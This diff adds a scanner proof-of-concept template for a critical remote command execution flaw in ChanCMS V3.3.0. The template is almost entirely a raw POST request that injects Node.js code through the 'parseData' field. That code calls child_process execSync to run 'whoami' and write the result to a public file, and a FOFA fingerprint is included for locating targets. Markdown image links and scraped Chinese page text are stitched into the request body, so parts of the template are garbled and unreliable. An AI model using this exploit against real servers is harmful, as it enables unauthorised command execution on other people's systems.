@@ -1,0 +1,19 @@
+id: poc-ri7lf9so3sbg30r6
+info:
+  name: ChanCMS V3.3.0 getArticle 存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ri7lf9so3sbg30r6'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ri7lf9so3sbg30r6
+    fofa: header="Chancms"
+http:
+- raw:
+  - "POST /cms/collect/getArticle HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 286\n\n{\n  \"taskUrl\": \"http://IP/favicon.ico\",\n  \"titleTag\": \"title\",\n  \"articleTag\": \"body\",\n  \"parseData\": \"return (async () => { const { execSync } = await import(/* webpackIgnore: true */ 'child_process'); return execSync('whoami>app/public/666.txt').toString(); })()\"\n}![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758978065360-54c7c89c-069d-4a26-94d4-77a985e43694.png)\n<font style=\"color:rgb(31, 35, 40);\">然后访问666.txt</font>\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758978065628-3a3855a4-e526-4518-8cfd-0d3d5d312609.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
